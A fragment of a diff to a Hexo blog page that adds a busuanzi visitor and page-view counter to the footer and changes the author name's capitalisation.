class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
-</body></html>
+
     </div>
 
     
@@ -396,10 +394,40 @@
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
-  <span class="author" itemprop="copyrightHolder">xdw</span>
+  <span class="author" itemprop="copyrightHolder">XDW</span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
   </div>
+
+#<div class="powered-by">
+#    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+#    <i class="fa fa-user-md"></i>
+#    <span id="busuanzi_container_site_uv">
+#        本站访客数:<span id="busuanzi_value_site_uv"></span>
+#    </span>
+#    <span class="post-meta-divider">|</span>
+#    <span id="busuanzi_container_site_pv">
+#        本站访问量<span id="busuanzi_value_site_pv"></span>
+#    </span>
+#</div>
 
     </div>
   </footer>
@@ -425,6 +453,7 @@
 
 
   
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
 
 
 
